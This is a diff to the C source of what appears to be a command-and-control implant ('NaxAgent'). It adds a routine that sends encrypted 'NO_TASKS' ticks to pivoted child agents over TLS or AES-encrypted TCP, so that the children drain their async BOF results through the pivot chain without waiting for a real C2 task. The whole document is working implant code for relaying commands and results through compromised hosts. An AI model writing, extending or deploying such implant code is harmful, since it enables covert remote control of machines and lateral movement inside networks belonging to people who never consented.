@@ -41,6 +41,7 @@ int nax_build_reg_body(const char *, uint32_t, const char *, uint32_t,
                        const char *, uint32_t,
                        uint8_t *, uint32_t *);
 int nax_build_heartbeat(uint8_t *, uint32_t *);
+int nax_build_no_tasks(uint8_t *, uint32_t *);
 int nax_build_result(uint32_t, uint8_t, const uint8_t *, uint32_t,
                      uint8_t *, uint32_t *);
 int nax_decode_task(const uint8_t *, uint32_t, NaxTask *);
@@ -321,6 +322,37 @@ static int send_encrypted(NaxAgent *a, int sock, uint8_t *frame, uint32_t frame_
     return rc;
 }
 
+/* Send a NO_TASKS tick to a bind child so it drains its async BOF
+ * results without waiting for a real task from the C2.
+ * send_encrypted() always goes to the parent — we must send directly
+ * to the child via p->ssl or p->sock. */
+static void ping_pivot_child(NaxAgent *a, NaxPivot *p)
+{
+    uint8_t  frame[NAX_FRAME_HDR + 16];
+    uint32_t frame_len = sizeof(frame);
+    if (nax_build_no_tasks(frame, &frame_len) < 0) return;
+
+    if (p->ssl) {
+        /* Child connected with TLS — use tls_send_encrypted directly */
+        tls_send_encrypted(a, (SSL *)p->ssl, frame, frame_len);
+    } else {
+        /* Child connected plain TCP — encrypt manually and send */
+        uint32_t enc_cap = frame_len + NAX_AES_IV + NAX_AES_BLOCK;
+        uint8_t *enc = malloc(enc_cap);
+        if (!enc) return;
+        uint32_t enc_len = enc_cap;
+        if (nax_encrypt(a->cfg.aes_key, frame, frame_len, enc, &enc_len) == 0) {
+            uint8_t hdr[4] = {
+                (uint8_t)(enc_len),       (uint8_t)(enc_len >> 8),
+                (uint8_t)(enc_len >> 16), (uint8_t)(enc_len >> 24)
+            };
+            send(p->sock, hdr, 4, MSG_NOSIGNAL);
+            send(p->sock, enc, enc_len, MSG_NOSIGNAL);
+        }
+        free(enc);
+    }
+}
+
 static int do_register(NaxAgent *a, int sock) {
     NaxSysInfo info;
     nax_gather_sysinfo(&info);
@@ -403,7 +435,13 @@ static void process_pivots_bind(NaxAgent *a, int parent_sock)
         NaxPivot *p = *pp;
         int broken  = 0;
 
+        /* Tick the child so it drains its async BOF results and responds.
+         * Without this, Pivoting2 stays blocked in poll(-1) until it
+         * receives a real task — results only arrive on the next command. */
+        ping_pivot_child(a, p);
+
         struct pollfd pfd = { .fd = p->sock, .events = POLLIN };
+        poll(&pfd, 1, 50);  /* short window for child to respond to tick */
         while (1) {
             int pr = poll(&pfd, 1, 0);
             if (pr <= 0) break;
